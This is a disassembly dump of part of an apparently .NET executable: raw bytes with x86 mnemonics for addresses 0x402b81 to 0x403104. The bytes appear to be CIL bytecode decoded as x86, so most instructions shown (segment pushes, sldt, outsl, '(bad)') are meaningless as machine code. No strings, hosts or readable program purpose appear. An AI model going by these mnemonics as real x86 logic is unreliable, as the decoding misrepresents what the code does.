  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 1e 21 00       	and    $0x211e72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 2c                	jb     0x4030a6
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 36 21 00       	and    $0x213672,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
